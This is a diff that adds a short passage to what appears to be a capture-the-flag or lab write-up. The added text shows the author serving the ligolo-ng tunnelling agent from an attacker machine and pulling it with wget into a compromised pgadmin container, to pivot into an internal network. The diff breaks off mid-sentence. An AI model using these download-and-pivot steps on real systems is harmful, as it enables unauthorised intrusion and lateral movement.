@@ -446,7 +446,32 @@ cb46692a4590:/pgadmin4$
 
 it looks as if there is more to the network
 
+So ill download the linux agent and proxy
 
+# Using ligolo-ng to scan internal network
+
+```python
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+So first ill host the agent
+
+```python
+cb46692a4590:/tmp$ wget http://10.10.14.61/agent
+Connecting to 10.10.14.61 (10.10.14.61:80)
+saving to 'agent'
+agent                100% |**************************************************************| 6996k  0:00:00 ETA
+'agent' saved
+cb46692a4590:/tmp$ ls -la
+total 7008
+drwxrwxrwt    1 root     root          4096 Aug 18 03:19 .
+drwxr-xr-x    1 root     root          4096 May 28  2025 ..
+-rw-r--r--    1 pgadmin  root       7164088 Aug 18 03:19 agent
+cb46692a4590:/tmp$ 
+```
+
+Then ill transfer the age
 
 
 
